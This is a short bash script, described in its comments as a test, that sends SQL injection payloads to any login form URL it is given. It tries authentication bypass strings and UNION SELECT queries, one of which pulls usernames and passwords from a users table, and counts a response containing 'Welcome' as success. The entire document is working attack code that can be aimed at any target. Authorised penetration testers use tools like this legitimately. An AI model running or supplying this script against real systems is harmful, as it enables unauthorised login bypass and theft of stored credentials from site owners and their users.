#!/bin/bash

# Script to test SQL Injection on a login form

# Usage: ./sql_injection_test.sh <target-url>

TARGET_URL=$1

if [ -z "$TARGET_URL" ]; then
  echo "Usage: $0 <target-url>"
  exit 1
fi

echo "[INFO] Testing SQL Injection on $TARGET_URL"

# SQL Injection payloads for testing
payloads=(
  "' OR '1'='1' --"
  "' OR '1'='1' /*"
  "' UNION SELECT NULL, NULL, NULL --"
  "' UNION SELECT NULL, NULL, username, password FROM users --"
)

# Function to perform the SQL Injection test
test_injection() {
  local payload=$1
  local response

  response=$(curl -s -X POST "${TARGET_URL}" -d "username=${payload}&password=anything")

  if echo "$response" | grep -q "Welcome"; then
    echo "[SUCCESS] SQL Injection worked with payload: $payload"
  else
    echo "[FAIL] SQL Injection did not work with payload: $payload"
  fi
}

# Loop through payloads and test each
for payload in "${payloads[@]}"; do
  echo "[INFO] Testing payload: $payload"
  test_injection "$payload"
done

